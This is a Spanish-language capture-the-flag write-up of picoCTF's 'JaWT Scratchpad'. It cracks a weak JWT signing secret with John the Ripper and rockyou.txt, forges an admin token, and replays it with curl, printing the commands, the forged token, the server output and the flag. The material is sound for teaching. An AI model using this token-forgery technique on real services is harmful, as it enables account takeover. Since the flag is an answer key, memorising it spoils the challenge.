# JaWT Scratchpad

## Descripción
¡Revisa el bloc de notas del administrador!
https://jupiter.challenges.picoctf.org/problem/58210/

## Pistas
- ¿Qué es esa cookie?
- ¿Ha oído hablar de JWT?

## Solución
- Primero encontramos la palabra que genera la firma del JWT usando la herramienta "John the Ripper" en kali, para ello usamos la lista de palabras "rockyou.txt":

```bash
┌──(kali㉿kali)-[~]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:01 DONE (2023-03-19 20:55) 0.7462g/s 5520Kp/s 5520Kc/s 5520KC/s iloverob4live345..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
- Luego creamos la token con firma "ilovepico" y el usuario "admin", una vez obtenida la token se la pasamos a la cookie "jwt" en la cabecera de la página:

```bash
C:\Users\Ricardo>curl https://jupiter.challenges.picoctf.org/problem/58210/ -H "Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s"
<!doctype html>
<html>

        <title> JaWT - an online scratchpad </title>
        <link rel="stylesheet" href="/static/css/stylesheet.css">
        <body>
                <header><h1>JaWT</h1> <br> <i><small>powered by <a href="https://jwt.io/">JWT</a></small></i></header>

                <div id="main">

                        <article>
                                <h1>Welcome to JaWT!</h1>

                                <p>
                                        JaWT is an online scratchpad, where you can "jot" down whatever you'd like! Consider it a notebook for your thoughts. <b style="color:blue "> JaWT works best in Google Chrome for some reason. </b>
                                </p>



                                        <h2> Hello admin!</h2>
                                        <p>
                                                Here is your JaWT scratchpad!
                                        </p>
                                        <textarea style="margin: 0 auto; display: block;">picoCTF{jawt_was_just_what_you_thought_44c752f5}</textarea>
                                        <br>

                                                <a href="/logout"><input style="width:100px" type="submit" value="Logout"></a>



                                <h2> Register with your name! </h2>

                                <p>
                                        You can use your name as a log in, because that's quick and easy to remember! If you don't like your name, use a short and cool one like <a href="https://github.com/magnumripper/JohnTheRipper">John</a>!
                                </p>

                        </article>
                        <nav></nav>
                        <aside></aside>

                </div>
                <script> window.onload = function() { document.getElementById("name").focus(); }; </script>
        </body>
</html>
```

## Bandera
picoCTF{jawt_was_just_what_you_thought_44c752f5}

## Notas adicionales
| Concepto | Descripción |
|--------|--------|
| jwt | Es un estándar abierto basado en JSON propuesto por IETF (RFC 7519) para la creación de tokens de acceso que permiten la propagación de identidad y privilegios |
| John the Ripper | Es un rápido descifrador de contraseñas |

## Referencias
[JWT](https://jwt.io/)
[JSON Web Token](https://es.wikipedia.org/wiki/JSON_Web_Token)
[John the Ripper](https://github.com/openwall/john)